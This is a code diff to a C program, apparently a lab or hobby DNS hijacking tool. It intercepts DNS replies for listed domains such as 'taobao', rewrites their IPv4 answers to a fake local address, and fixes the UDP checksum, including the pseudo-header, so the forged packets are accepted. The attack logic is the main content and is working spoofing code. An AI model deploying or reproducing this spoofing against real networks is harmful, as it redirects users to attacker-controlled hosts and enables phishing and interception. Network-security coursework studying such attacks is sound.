@@ -241,7 +241,8 @@ int three()
     _dns_port = htons(dns);
     
     int send_enable = 1;
-    char *Hdn[100] = {"baidu", "bdimg", "bdstatic", NULL};
+    char *Hdn[100] = {"taobao", NULL, "bdimg", "bdstatic", NULL};
+    //char *Hdn[100] = {"baidu", "bdimg", "bdstatic", NULL};
     u8 DNS_response_pack[1000]={0};
 	while(1)
 	{
@@ -292,12 +293,13 @@ int three()
                             question_length += 1;
                             p++;
                         }
-                        question_length -= 1;/* 域名长度 */
-                        question_length += 4;/* 查询类型 查询类 4byte */
+
+                        question_length += 5;/*0x00 1byte 查询类型 查询类 4byte */
                         
                         //printf("totallength=%d\n", question_length);
                         
                         int answernum = ntohs(dnsframe->answer_rrs);
+                        //printf("*******answer num: %d*******\n",answernum);
                         
                         int i = 0;
                         while(Hdn[i] != NULL)
@@ -305,21 +307,58 @@ int three()
                         	if(0 == strcmp(domain, Hdn[i])) /* 如果目标访问的是被劫持域名，则修改数据包并返回给主机一个假的ip地址 */
                         	{
                                 //change ipaddr
-                                printf("**********hijack\n");
-                                dns_answer *answer = (dns_answer *)(dnsframe->domain+question_length);
+                                u8 *answer_c = (u8 *)(dnsframe->domain+question_length);
                         		while(answernum)
                                 {
                                     answernum--;
+                                    dns_answer *answer = (dns_answer *)answer_c;
                                     if(answer->type == htons(0x0001))/* 若响应类型是IPV4地址，则更改 */
                                     {
-                                        answer->ipaddr = inet_addr("192.168.3.113");
+                                        answer->ipaddr = inet_addr("192.168.1.109");
                                     }
-                                    answer++;
+                                    answer_c = answer_c + 12 + ntohs(answer->datalength);
                                 }
                                 //change udp_check_sum
+                                //wei header
+                                udp_whdr whdr;
+                                memset(&whdr, 0xaa, sizeof(whdr));
+                                whdr.srcip = ip->iphdr.srcip;
+                                whdr.dstip = ip->iphdr.dstip;
+                                whdr.zero = 0;
+                                whdr.protocol = 0x11;
+                                whdr.length = htons(recv_size-sizeof(ip_datagram));
+
+                                //udp header
+                                //printf("hdsize:%ld\n",sizeof(udp_header));
+                                memcpy(&(whdr.udphdr.srcport), &(dnsframe->udphdr.srcport), sizeof(udp_header));
+                                //udp_data
+                                //printf("datasize:%d\n",recv_size-sizeof(udp_datagram));
+                                memcpy(whdr.udpdata, &(dnsframe->transactionid), recv_size-sizeof(udp_datagram));
+                                //printf("recv_size:%d\n",recv_size);
+                                int y = 0;
+                                
+
+                                // s = (u8 *)whdr.udphdr;
+                                // for(y=0;y<50;y++)
+                                // {
+                                // 	printf("%02x ",*s);fflush(stdout);
+                                // 	s++;
+                                // 	if(y%16==0) printf("\n");
+                                // }
+                                whdr.udphdr.check_sum = 0;
                                 dnsframe->udphdr.check_sum = 0;
-                                dnsframe->udphdr.check_sum = htons(check_sum((u16 *)&dnsframe->udphdr, \
-                                recv_size-sizeof(ip_datagram)));
+
+                                // u8 *s = (u8 *)&(whdr.srcip);
+                                // for(;y<100;y++)
+                                // {
+                                // 	if(y%16==0) printf("\n");
+                                // 	printf("%02x ",*s);fflush(stdout);
+                                // 	s++;
+                                // }
+                                //printf("checksize:%d\n",recv_size-sizeof(ip_datagram));
+                                dnsframe->udphdr.check_sum = check_sum((u16 *)&whdr,\
+                                recv_size-sizeof(ip_datagram) + 12); // 12 is weihdr size
+                                //printf("check:%04x\n",dnsframe->udphdr.check_sum);
                                 break;
                         	}
                         	i++;
